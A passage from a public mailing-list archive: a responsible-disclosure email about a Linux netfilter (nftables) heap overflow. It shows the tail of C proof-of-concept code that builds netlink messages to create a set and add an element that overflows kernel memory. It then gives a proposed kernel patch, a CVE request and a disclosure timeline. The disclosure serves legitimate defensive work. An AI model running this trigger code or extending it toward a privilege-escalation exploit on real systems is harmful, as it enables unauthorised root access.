NFTA_SET_ELEM_LIST_SET
 &#160;&#160;&#160; nlh_payload_size += 
U32_NLA_SIZE;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // 
NFTA_SET_ELEM_LIST_SET_ID
 &#160;&#160;&#160; nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

 &#160;&#160;&#160; /** Allocation **/
 &#160;&#160;&#160; nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
 &#160;&#160;&#160; if (!nlh_payload) {
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;malloc&#34;);
 &#160;&#160;&#160; }
 &#160;&#160;&#160; memset(nlh_payload, 0, nlh_payload_size);

 &#160;&#160;&#160; /** Fill the required fields **/
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_len = nlh_payload_size;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | 
NFT_MSG_NEWSETELEM;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_pid = getpid();
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST;
 &#160;&#160;&#160; nlh_payload-&gt;nlmsg_seq = 0;

 &#160;&#160;&#160; /** Setup the nfgenmsg **/
 &#160;&#160;&#160; nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
 &#160;&#160;&#160; nfm-&gt;nfgen_family = NFPROTO_INET;

 &#160;&#160;&#160; /** Setup the attributes */
 &#160;&#160;&#160; attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
 &#160;&#160;&#160; attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
 &#160;&#160;&#160; attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
 &#160;&#160;&#160; attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
 &#160;&#160;&#160; attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, 
nested_attr_size);

 &#160;&#160;&#160; attr = set_nested_attr(attr, 0, nested_attr_size - 4);
 &#160;&#160;&#160; attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, 
NLA_BIN_SIZE(set_keylen));
 &#160;&#160;&#160; attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer, 
set_keylen);
 &#160;&#160;&#160; attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + 
sizeof(struct nlattr));
 &#160;&#160;&#160; attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
 &#160;&#160;&#160; set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

 &#160;&#160;&#160; /* Last netlink message: End of batch */
 &#160;&#160;&#160; nlh_batch_end = get_batch_end_nlmsg();

 &#160;&#160;&#160; /* Setup the iovec */
 &#160;&#160;&#160; memset(iov, 0, sizeof(struct iovec) * 3);
 &#160;&#160;&#160; iov[0].iov_base = (void *)nlh_batch_begin;
 &#160;&#160;&#160; iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[1].iov_base = (void *)nlh_payload;
 &#160;&#160;&#160; iov[1].iov_len = nlh_payload-&gt;nlmsg_len;
 &#160;&#160;&#160; iov[2].iov_base = (void *)nlh_batch_end;
 &#160;&#160;&#160; iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;

 &#160;&#160;&#160; /* Prepare the message to send */
 &#160;&#160;&#160; memset(&#38;msg, 0, sizeof(struct msghdr));
 &#160;&#160;&#160; msg.msg_name = (void *)&#38;dest_snl;
 &#160;&#160;&#160; msg.msg_namelen = sizeof(struct sockaddr_nl);
 &#160;&#160;&#160; msg.msg_iov = iov;
 &#160;&#160;&#160; msg.msg_iovlen = 3;

 &#160;&#160;&#160; /* Send message */
 &#160;&#160;&#160; sendmsg(sock, &#38;msg, 0);

 &#160;&#160;&#160; /* Free allocated memory */
 &#160;&#160;&#160; free(nlh_batch_end);
 &#160;&#160;&#160; free(nlh_payload);
 &#160;&#160;&#160; free(nlh_batch_begin);
}

int main(int argc, char **argv) {

 &#160;&#160;&#160; int sock;
 &#160;&#160;&#160; struct sockaddr_nl snl;
 &#160;&#160;&#160; struct leak *bases;

 &#160;&#160;&#160; new_ns();
 &#160;&#160;&#160; printf(&#34;[+] Get CAP_NET_ADMIN capability\n&#34;);

 &#160;&#160;&#160; /* Netfilter netlink socket creation */
 &#160;&#160;&#160; if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) &lt; 0) {
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;socket&#34;);
 &#160;&#160;&#160; }
 &#160;&#160;&#160; printf(&#34;[+] Netlink socket created\n&#34;);

 &#160;&#160;&#160; // Binding
 &#160;&#160;&#160; memset(&#38;snl, 0, sizeof(snl));
 &#160;&#160;&#160; snl.nl_family = AF_NETLINK;
 &#160;&#160;&#160; snl.nl_pid = getpid();
 &#160;&#160;&#160; if (bind(sock, (struct sockaddr *)&#38;snl, sizeof(snl)) &lt; 0) {
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; do_error_exit(&#34;bind&#34;);
 &#160;&#160;&#160; }
 &#160;&#160;&#160; printf(&#34;[+] Netlink socket bound\n&#34;);

 &#160;&#160;&#160; /* Create a netfilter table */
 &#160;&#160;&#160; create_table(sock, TABLE);
 &#160;&#160;&#160; printf(&#34;[+] Table created\n&#34;);

 &#160;&#160;&#160; /*&#160; Create a netfilter set */
 &#160;&#160;&#160; create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
 &#160;&#160;&#160; printf(&#34;[+] Set created\n&#34;);

 &#160;&#160;&#160; /* Prepare the payload for the write primitive */
 &#160;&#160;&#160; add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID, 
BUFFER_SIZE, buffer);
 &#160;&#160;&#160; printf(&#34;[+] Overflow done\n&#34;);

 &#160;&#160;&#160; return EXIT_SUCCESS;
}
```

We propose the following patch. We think that the comparison must be 
mandatory and may be enough for patch this vulnerability.
However, we are not experts at Linux kernel programming and we are still 
unsure if it will not break something along the way.
This patch was applied on the current upstream version.

```diff
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nft_data_desc *desc,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nft_data *data,
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; struct nlattr *attr)
{

 &#160;&#160;&#160; ...

-&#160;&#160;&#160; if (desc-&gt;type != NFT_DATA_VERDICT &#38;&#38; desc-&gt;len != set-&gt;dlen) {
+&#160;&#160;&#160; if (desc-&gt;len != set-&gt;dlen) {

 &#160;&#160; &#160;&#160;&#160;&#160; &#160;&#160;&#160; &#160;&#160;&#160; nft_data_release(data, desc-&gt;type);
 &#160;&#160;&#160;&#160;&#160;&#160;&#160; return -EINVAL;
 &#160;&#160;&#160; }

 &#160;&#160;&#160; return 0;
}
```

We would like to reserve a CVE for this vulnerability.

Also, we would like to release the LPE exploit targeting Ubuntu server 
along with a more detailed blogpost.
If needed, we can supply the exploit. Depending of your workload, we can 
suggest the August, 15th 2022 as a potential date for public disclosure.

Thank you for your attention and we also would like to thank you for all 
the work put on the Linux kernel.


<a
href=#ma10c0f58da9851b3f353b126fe8e3f85c7dbef07
id=ea10c0f58da9851b3f353b126fe8e3f85c7dbef07>^</a> <a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/">permalink</a> <a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/raw">raw</a> <a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/#R">reply</a>	[<a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u"><b>flat</b></a>|<a
href="../../cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/t/#u">nested</a>] <a
href=#ra10c0f58da9851b3f353b126fe8e3f85c7dbef07>only message in thread</a></pre><hr><pre>only message in thread, other threads:[<a
href="../../?t=20220701154326">~2022-07-01 15:43 UTC</a> | <a
href="../../">newest</a>]

<b
id=t>Thread overview:</b> (only message) (download: <a
href="../t.mbox.gz">mbox.gz</a> follow: <a
href="../t.atom">Atom feed</a>
-- links below jump to the message on this page --
2022-07-01 15:43 <a
href="#ma10c0f58da9851b3f353b126fe8e3f85c7dbef07"
id=ra10c0f58da9851b3f353b126fe8e3f85c7dbef07>[vs] Netfilter vulnerability disclosure</a> Hugues ANGUELKOV
</pre><hr><pre>This is a public inbox, see <a
href="../../_/text/mirror/">mirroring instructions</a>
for how to clone and mirror all data and code used for this inbox;
as well as URLs for NNTP newsgroup(s).</pre></body></html>